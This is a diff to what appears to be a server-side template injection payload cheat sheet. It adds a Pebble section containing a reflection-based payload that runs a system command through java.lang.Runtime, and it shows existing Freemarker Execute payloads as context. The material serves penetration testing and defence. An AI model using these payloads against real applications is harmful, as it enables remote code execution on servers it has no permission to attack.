@@ -22,6 +22,9 @@
 * [Freemarker](#freemarker)
   * [Basic injection](#basic-injection)
   * [Code execution](#code-execution)
+* [Peeble](#peeble)
+  * [Basic injection](#basic-injection)
+  * [Code execution](#code-execution)
 * [Jade / Codepen](#jade---codepen)
 * [Velocity](#velocity)
 * [Mako](#mako)
@@ -37,6 +40,7 @@
 * [Jinjava](#jinjava)
   * [Basic injection](#basic-injection)
   * [Command execution](#command-execution)
+* [References](#references)
 
 ## Tools
 
@@ -151,6 +155,31 @@ The template can be `${3*3}` or the legacy `#{3*3}`
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
 ${"freemarker.template.utility.Execute"?new()("id")}
+```
+
+## Pebble
+
+### Basic injection
+
+```java
+{{ someString.toUPPERCASE() }}
+```
+
+### Code execution
+
+```java
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE
+     .forName('java.lang.String')
+     .constructors[0]
+     .newInstance(([bytes]).toArray()) }}
 ```
 
 ## Jade / Codepen
@@ -355,3 +384,4 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 * [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
 * [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
 * [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
+* [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
